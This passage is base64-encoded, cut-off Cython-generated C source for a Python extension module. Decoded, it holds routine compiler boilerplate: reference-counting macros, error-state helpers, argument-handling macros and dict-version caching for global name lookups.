9QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4xIFB5Q3JpdGljYWxTZWN0aW9uX0JlZ2luCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4yIFB5Q3JpdGljYWxTZWN0aW9uMl9CZWdpbgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZDEgUHlDcml0aWNhbFNlY3Rpb25fRW5kCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMiBQeUNyaXRpY2FsU2VjdGlvbjJfRW5kCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG8pIHsKI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpIH0KI2Vsc2UKI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04KI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTiBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTgojZW5kaWYKCgoKCgoKc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByOwpzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByOwpzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByOwpzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByOwoKCnN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciB7CiAgUHlPYmplY3RfSEVBRAogIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wOwogIFB5T2JqZWN0ICpfX3B5eF92X2k7Cn07CgoKCnN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgewogIFB5T2JqZWN0X0hFQUQKICBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMDsKICBQeU9iamVjdCAqX19weXhfdl9pOwp9OwoKCgpzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIHsKICBQeU9iamVjdF9IRUFECiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaTsKfTsKCgoKc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciB7CiAgUHlPYmplY3RfSEVBRAogIGxvbmcgX19weXhfdl9fOwp9OwoKCgoKCiNpZm5kZWYgQ1lUSE9OX1JFRk5BTk5ZCiAgI2RlZmluZSBDWVRIT05fUkVGTkFOTlkgMAojZW5kaWYKI2lmIENZVEhPTl9SRUZOQU5OWQogIHR5cGVkZWYgc3RydWN0IHsKICAgIHZvaWQgKCpJTkNSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpOwogICAgdm9pZCAoKkRFQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7CiAgICB2b2lkICgqR09UUkVGKSh2b2lkKiwgUHlPYmplY3QqLCBQeV9zc2l6ZV90KTsKICAgIHZvaWQgKCpHSVZFUkVGKSh2b2lkKiwgUHlPYmplY3QqLCBQeV9zc2l6ZV90KTsKICAgIHZvaWQqICgqU2V0dXBDb250ZXh0KShjb25zdCBjaGFyKiwgUHlfc3NpemVfdCwgY29uc3QgY2hhciopOwogICAgdm9pZCAoKkZpbmlzaENvbnRleHQpKHZvaWQqKik7CiAgfSBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdDsKICBzdGF0aWMgX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKl9fUHl4X1JlZk5hbm55ID0gTlVMTDsKICBzdGF0aWMgX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKl9fUHl4X1JlZk5hbm55SW1wb3J0QVBJKGNvbnN0IGNoYXIgKm1vZG5hbWUpOwogICNkZWZpbmUgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMgdm9pZCAqX19weXhfcmVmbmFubnkgPSBOVUxMOwogICNkZWZpbmUgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQobmFtZSwgYWNxdWlyZV9naWwpXAogICAgICAgICAgaWYgKGFjcXVpcmVfZ2lsKSB7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfU1RBVEUgX19weXhfZ2lsc3RhdGVfc2F2ZSA9IFB5R0lMU3RhdGVfRW5zdXJlKCk7XAogICAgICAgICAgICAgIF9fcHl4X3JlZm5hbm55ID0gX19QeXhfUmVmTmFubnktPlNldHVwQ29udGV4dCgobmFtZSksIChfX0xJTkVfXyksIChfX0ZJTEVfXykpO1wKICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XAogICAgICAgICAgfSBlbHNlIHtcCiAgICAgICAgICAgICAgX19weXhfcmVmbmFubnkgPSBfX1B5eF9SZWZOYW5ueS0+U2V0dXBDb250ZXh0KChuYW1lKSwgKF9fTElORV9fKSwgKF9fRklMRV9fKSk7XAogICAgICAgICAgfQogICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKSB7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfU1RBVEUgX19weXhfZ2lsc3RhdGVfc2F2ZSA9IFB5R0lMU3RhdGVfRW5zdXJlKCk7XAogICAgICAgICAgICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1wKICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XAogICAgICAgICAgfQogICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKSB7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfU1RBVEUgX19weXhfZ2lsc3RhdGVfc2F2ZSA9IFB5R0lMU3RhdGVfRW5zdXJlKCk7XAogICAgICAgICAgICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1wKICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XAogICAgICAgICAgfQogICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KClcCiAgICAgICAgICBfX1B5eF9SZWZOYW5ueS0+RmluaXNoQ29udGV4dCgmX19weXhfcmVmbmFubnkpCiAgI2RlZmluZSBfX1B5eF9JTkNSRUYocikgIF9fUHl4X1JlZk5hbm55LT5JTkNSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSkKICAjZGVmaW5lIF9fUHl4X0RFQ1JFRihyKSAgX19QeXhfUmVmTmFubnktPkRFQ1JFRihfX3B5eF9yZWZuYW5ueSwgKFB5T2JqZWN0ICopKHIpLCAoX19MSU5FX18pKQogICNkZWZpbmUgX19QeXhfR09UUkVGKHIpICBfX1B5eF9SZWZOYW5ueS0+R09UUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpCiAgI2RlZmluZSBfX1B5eF9HSVZFUkVGKHIpIF9fUHl4X1JlZk5hbm55LT5HSVZFUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpCiAgI2RlZmluZSBfX1B5eF9YSU5DUkVGKHIpICBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfSU5DUkVGKHIpOyB9fSB3aGlsZSgwKQogICNkZWZpbmUgX19QeXhfWERFQ1JFRihyKSAgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0RFQ1JFRihyKTsgfX0gd2hpbGUoMCkKICAjZGVmaW5lIF9fUHl4X1hHT1RSRUYocikgIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9HT1RSRUYocik7IH19IHdoaWxlKDApCiAgI2RlZmluZSBfX1B5eF9YR0lWRVJFRihyKSBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfR0lWRVJFRihyKTt9fSB3aGlsZSgwKQojZWxzZQogICNkZWZpbmUgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICAjZGVmaW5lIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KG5hbWUsIGFjcXVpcmVfZ2lsKQogICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKQogICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCkKICAjZGVmaW5lIF9fUHl4X0lOQ1JFRihyKSBQeV9JTkNSRUYocikKICAjZGVmaW5lIF9fUHl4X0RFQ1JFRihyKSBQeV9ERUNSRUYocikKICAjZGVmaW5lIF9fUHl4X0dPVFJFRihyKQogICNkZWZpbmUgX19QeXhfR0lWRVJFRihyKQogICNkZWZpbmUgX19QeXhfWElOQ1JFRihyKSBQeV9YSU5DUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpIFB5X1hERUNSRUYocikKICAjZGVmaW5lIF9fUHl4X1hHT1RSRUYocikKICAjZGVmaW5lIF9fUHl4X1hHSVZFUkVGKHIpCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5X1hERUNSRUZfU0VUKHIsIHYpIGRvIHtcCiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1wKICAgICAgICByID0gdjsgUHlfWERFQ1JFRih0bXApO1wKICAgIH0gd2hpbGUgKDApCiNkZWZpbmUgX19QeXhfWERFQ1JFRl9TRVQociwgdikgZG8ge1wKICAgICAgICBQeU9iamVjdCAqdG1wID0gKFB5T2JqZWN0ICopIHI7XAogICAgICAgIHIgPSB2OyBfX1B5eF9YREVDUkVGKHRtcCk7XAogICAgfSB3aGlsZSAoMCkKI2RlZmluZSBfX1B5eF9ERUNSRUZfU0VUKHIsIHYpIGRvIHtcCiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1wKICAgICAgICByID0gdjsgX19QeXhfREVDUkVGKHRtcCk7XAogICAgfSB3aGlsZSAoMCkKI2RlZmluZSBfX1B5eF9DTEVBUihyKSAgICBkbyB7IFB5T2JqZWN0KiB0bXAgPSAoKFB5T2JqZWN0KikocikpOyByID0gTlVMTDsgX19QeXhfREVDUkVGKHRtcCk7fSB3aGlsZSgwKQojZGVmaW5lIF9fUHl4X1hDTEVBUihyKSAgIGRvIHsgaWYoKHIpICE9IE5VTEwpIHtQeU9iamVjdCogdG1wID0gKChQeU9iamVjdCopKHIpKTsgciA9IE5VTEw7IF9fUHl4X0RFQ1JFRih0bXApO319IHdoaWxlKDApCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoZXJyKSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShfX3B5eF90c3RhdGUsIGVycikKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNJblN0YXRlKFB5VGhyZWFkU3RhdGUqIHRzdGF0ZSwgUHlPYmplY3QqIGVycik7CiNlbHNlCiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhlcnIpICBQeUVycl9FeGNlcHRpb25NYXRjaGVzKGVycikKI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZSAgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlOwojZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduICBfX3B5eF90c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE2CiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gIT0gTlVMTCkKI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA/IChQeU9iamVjdCopIFB5X1RZUEUoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbikgOiAoUHlPYmplY3QqKSBOVUxMKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5RXJyX09jY3VycmVkKCkgIChfX3B5eF90c3RhdGUtPmN1cmV4Y190eXBlICE9IE5VTEwpCiNkZWZpbmUgX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUpCiNlbmRpZgojZWxzZQojZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQojZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKFB5RXJyX09jY3VycmVkKCkgIT0gTlVMTCkKI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICBQeUVycl9PY2N1cnJlZCgpCiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9QeUVycl9DbGVhcigpIF9fUHl4X0VyclJlc3RvcmUoTlVMTCwgTlVMTCwgTlVMTCkKI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGVfR0VUKCksIHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJGZXRjaFdpdGhTdGF0ZSh0eXBlLCB2YWx1ZSwgdGIpICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZShQeVRocmVhZFN0YXRlX0dFVCgpLCB0eXBlLCB2YWx1ZSwgdGIpCiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZShfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJGZXRjaCh0eXBlLCB2YWx1ZSwgdGIpICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZShfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICp0eXBlLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICp0Yik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyRmV0Y2hJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTYKI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgKFB5X0lOQ1JFRihleGMpLCBfX1B5eF9FcnJSZXN0b3JlKChleGMpLCBOVUxMLCBOVUxMKSkKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgUHlFcnJfU2V0Tm9uZShleGMpCiNlbmRpZgojZWxzZQojZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgUHlFcnJfQ2xlYXIoKQojZGVmaW5lIF9fUHl4X1B5RXJyX1NldE5vbmUoZXhjKSBQeUVycl9TZXROb25lKGV4YykKI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyckZldGNoV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX0ZldGNoKHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZSh0c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyckZldGNoSW5TdGF0ZSh0c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX0ZldGNoKHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyckZldGNoKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX0ZldGNoKHR5cGUsIHZhbHVlLCB0YikKI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG8sbikgUHlPYmplY3RfR2V0QXR0cihvLG4pCiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKTsKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OYW1lKFB5T2JqZWN0ICpuYW1lKTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxpc3RfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pOwojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fTUVUSF9GQVNUQ0FMTApzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlUdXBsZV9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3Qgbik7CiNlbmRpZgoKCiNpbmNsdWRlIDxzdHJpbmcuaD4KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlCeXRlc19FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKFB5T2JqZWN0KiBzMSwgUHlPYmplY3QqIHMyLCBpbnQgZXF1YWxzKTsKCgojaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKGFyZ3MsIGkpCiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfTmV3UmVmKF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oYXJncywgaSkpCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X0FyZ1JlZl9WQVJBUkdTKGFyZ3MsIGkpIF9fUHl4X1hOZXdSZWYoUHlUdXBsZV9HZXRJdGVtKGFyZ3MsIGkpKQojZW5kaWYKI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfVkFSQVJHUyhrd2RzKSBQeURpY3RfU2l6ZShrd2RzKQojZGVmaW5lIF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1MoYXJncywgbmFyZ3MpIE5VTEwKI2RlZmluZSBfX1B5eF9HZXRLd1ZhbHVlX1ZBUkFSR1Moa3csIGt3dmFsdWVzLCBzKSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihrdywgcykKI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfVkFSQVJHUyhrdywga3d2YWx1ZXMpIFB5RGljdF9Db3B5KGt3KQojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX0ZBU1RDQUxMKGFyZ3MsIGkpIF9fUHl4X05ld1JlZihhcmdzW2ldKQogICAgI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoa3dkcykgX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd2RzKQogICAgI2RlZmluZSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChhcmdzLCBuYXJncykgKChhcmdzKSArIChuYXJncykpCiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X0dldEt3VmFsdWVfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMsIFB5T2JqZWN0ICpzKTsKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgQ1lUSE9OX1VOVVNFRCBzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0t3YXJnc0FzRGljdF9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcyk7CiAgI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKGt3LCBrd3ZhbHVlcykgX1B5U3RhY2tfQXNEaWN0KGt3dmFsdWVzLCBrdykKICAjZW5kaWYKI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX0ZBU1RDQUxMIF9fUHl4X0FyZ1JlZl9WQVJBUkdTCiAgICAjZGVmaW5lIF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTCBfX1B5eF9OdW1Ld2FyZ3NfVkFSQVJHUwogICAgI2RlZmluZSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTCBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTCiAgICAjZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfRkFTVENBTEwgX19QeXhfR2V0S3dWYWx1ZV9WQVJBUkdTCiAgICAjZGVmaW5lIF9fUHl4X0t3YXJnc0FzRGljdF9GQVNUQ0FMTCBfX1B5eF9Ld2FyZ3NBc0RpY3RfVkFSQVJHUwojZW5kaWYKI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfVkFSQVJHUyhhcmdzLCBzdGFydCwgc3RvcCkgUHlUdXBsZV9HZXRTbGljZShhcmdzLCBzdGFydCwgc3RvcCkKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMIHx8IChDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMpCiNkZWZpbmUgX19QeXhfQXJnc1NsaWNlX0ZBU1RDQUxMKGFyZ3MsIHN0YXJ0LCBzdG9wKSBfX1B5eF9QeVR1cGxlX0Zyb21BcnJheShhcmdzICsgc3RhcnQsIHN0b3AgLSBzdGFydCkKI2Vsc2UKI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfRkFTVENBTEwoYXJncywgc3RhcnQsIHN0b3ApIFB5VHVwbGVfR2V0U2xpY2UoYXJncywgc3RhcnQsIHN0b3ApCiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiNkZWZpbmUgX19QWVhfRElDVF9WRVJTSU9OX0lOSVQgICgoUFlfVUlOVDY0X1QpIC0xKQojZGVmaW5lIF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgICgoKFB5RGljdE9iamVjdCopKGRpY3QpKS0+bWFfdmVyc2lvbl90YWcpCiNkZWZpbmUgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoZGljdCwgdmFsdWUsIGNhY2hlX3ZhciwgdmVyc2lvbl92YXIpXAogICAgKHZlcnNpb25fdmFyKSA9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCk7XAogICAgKGNhY2hlX3ZhcikgPSAodmFsdWUpOwojZGVmaW5lIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKFZBUiwgRElDVCwgTE9PS1VQKSB7XAogICAgc3RhdGljIFBZX1VJTlQ2NF9UIF9fcHl4X2RpY3RfdmVyc2lvbiA9IDA7XAogICAgc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IE5VTEw7XAogICAgaWYgKGxpa2VseShfX1BZWF9HRVRfRElDVF9WRVJTSU9OKERJQ1QpID09IF9fcHl4X2RpY3RfdmVyc2lvbikpIHtcCiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZTtcCiAgICB9IGVsc2Uge1wKICAgICAgICAoVkFSKSA9IF9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlID0gKExPT0tVUCk7XAogICAgICAgIF9fcHl4X2RpY3RfdmVyc2lvbiA9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oRElDVCk7XAogICAgfVwKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihQeU9iamVjdCAqb2JqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X29iamVjdF9kaWN0X3ZlcnNpb25fbWF0Y2hlcyhQeU9iamVjdCogb2JqLCBQWV9VSU5UNjRfVCB0cF9kaWN0X3ZlcnNpb24sIFBZX1VJTlQ2NF9UIG9ial9kaWN0X3ZlcnNpb24pOwojZWxzZQojZGVmaW5lIF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgICgwKQojZGVmaW5lIF9fUFlYX1VQREFURV9ESUNUX0NBQ0hFKGRpY3QsIHZhbHVlLCBjYWNoZV92YXIsIHZlcnNpb25fdmFyKQojZGVmaW5lIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKFZBUiwgRElDVCwgTE9PS1VQKSAgKFZBUikgPSAoTE9PS1VQKTsKI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwojZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUodmFyLCBuYW1lKSAgZG8ge1wKICAgIHN0YXRpYyBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb24gPSAwO1wKICAgIHN0YXRpYyBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWUgPSBOVUxMO1wKICAgICh2YXIpID0gKGxpa2VseShfX3B5eF9kaWN0X3ZlcnNpb24gPT0gX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kKSkpID9cCiAgICAgICAgKGxpa2VseShfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSkgPyBfX1B5eF9OZXdSZWYoX19weXhfZGljdF9jYWNoZWRfdmFsdWUpIDogX19QeXhfR2V0QnVpbHRpbk5hbWUobmFtZSkpIDpcCiAgICAgICAgX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUobmFtZSwgJl9fcHl4X2RpY3RfdmVyc2lvbiwg